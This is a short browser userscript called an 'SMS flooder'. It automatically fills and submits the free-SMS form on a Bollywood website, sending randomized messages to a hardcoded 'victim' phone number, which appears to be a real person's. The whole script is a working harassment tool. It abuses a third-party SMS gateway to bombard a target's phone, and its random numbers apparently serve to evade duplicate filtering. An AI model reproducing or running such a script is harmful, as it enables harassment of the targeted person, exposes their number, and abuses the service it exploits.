// ==UserScript==
// @name          Anonymous 500 char sms flooder
// @namespace     Amar
// @description   flooder sms
// @include       http://*bollywoodmotion.com/*
// ==/UserScript==

var victim=8877782959; //Enter victims number here
var msg="FLOODING CHALU HAI"; // Enter delay in milliseconds if required
var urname="HAHA";

if(document.location=="http://www.bollywoodmotion.com/freesms/sms/sms.php"||document.location=="http://bollywoodmotion.com/freesms/sms/sms.php")
{
document.getElementsByName("mv")[0].value=victim;
document.getElementsByName("message")[0].value=Math.floor(Math.random()*1456484)+"\n"+msg+Math.floor(Math.random()*1456484);
document.getElementsByName("name")[0].value=urname;
void(0);
document.getElementsByName("ozbtn_login")[0].click();

}